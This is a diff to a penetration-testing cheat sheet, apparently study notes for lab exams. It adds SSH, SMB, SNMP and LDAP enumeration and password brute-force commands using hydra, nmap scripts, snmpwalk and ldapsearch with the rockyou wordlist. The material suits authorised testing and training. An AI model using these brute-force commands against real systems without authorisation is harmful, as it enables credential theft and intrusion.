@@ -17,6 +17,10 @@ medusa -u $USER -P /usr/share/wordlists/rockyou.txt -e ns -h $TARGET - 22 -M ssh
 hydra -s 22 -v -l $USER -P /usr/share/wordlists/rockyou.txt -e nsr -t 4 $TARGET ssh
 ncrack -vv -p 22 --user $USER -P /usr/share/wordlists/rockyou.txt $TARGET
 ```
+Check for weak diffie-hellman groups
+```
+https://github.com/GDSSecurity/SSH-Weak-DH
+```
 
 # 25 SMTP
 ```bash
@@ -52,6 +56,9 @@ smbclient //MOUNT/share -I $TARGET N
 smbclient -L //$TARGET
 enum4linux -a $TARGET
 rpcclient -U "" $TARGET
+
+# brute
+hydra -l manager -P /usr/share/wordlists/rockyou.txt 10.11.1.202 smb
 ```
 
 # 111/2049 NFS
@@ -63,10 +70,31 @@ nmap -p 111,2049 --script=nfs-statfs 10.10.10.10
 mkdir /tmp/mount
 mount -t nfs -o nolock 10.10.10.10:/nfs/path /tmp/mount
 ```
+# 161 SNMP
+v1/2
+```bash
+snmpwalk -v 2c -c public 10.10.10.1
+```
+
+v3
+```bash
+# enumerate usernames
+snmpv3enum.rb -i 10.0.0.5 -u usernames
+
+# brute
+hydra -U snmp
+```
 
 # 389 LDAP
 ```bash
 nmap -n -v -p 389 --script ldap-rootdse.nse -sV 10.11.1.201
+
+nmap -n -v -p 389 --script ldap-search.nse -sV 10.11.1.201
+
+ldapsearch -D "cn=admin" -w secret123 -p 389 -h 10.10.10.10 -s base -b "ou=people,dc=orachrvile,dc=com" "objectclass=*"
+
+# brute
+nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' <host>
 ```
 
 # 80/443 - HTTP Servers
